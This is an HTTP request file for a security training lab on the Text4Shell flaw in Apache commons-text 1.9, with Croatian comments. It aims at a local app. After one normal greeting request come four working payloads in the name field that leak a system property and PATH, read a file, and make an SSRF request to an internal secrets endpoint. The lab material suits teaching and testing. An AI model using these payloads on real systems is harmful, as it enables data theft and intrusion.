### Lab05 – Software Supply Chain (commons-text Text4Shell)
@host = http://localhost:8080

### 1. Obican pozdrav (radi uvijek)
POST {{host}}/api/lab05/greeting
Content-Type: application/json

{"name": "Ana"}

### 2. EKSPLOATACIJA: interpolacija sistemskog svojstva
# Ranjivo (main, commons-text 1.9): vraca stvarnu vrijednost. Popravljeno: doslovni tekst.
POST {{host}}/api/lab05/greeting
Content-Type: application/json

{"name": "${sys:java.version}"}

### 3. EKSPLOATACIJA: varijabla okoline
POST {{host}}/api/lab05/greeting
Content-Type: application/json

{"name": "${env:PATH}"}

### 4. EKSPLOATACIJA: citanje datoteke
POST {{host}}/api/lab05/greeting
Content-Type: application/json

{"name": "${file:UTF-8:pom.xml}"}

### 5. EKSPLOATACIJA: SSRF kroz url lookup (spoj s lab03 metom)
POST {{host}}/api/lab05/greeting
Content-Type: application/json

{"name": "${url:UTF-8:http://127.0.0.1:8080/internal/admin/secrets}"}
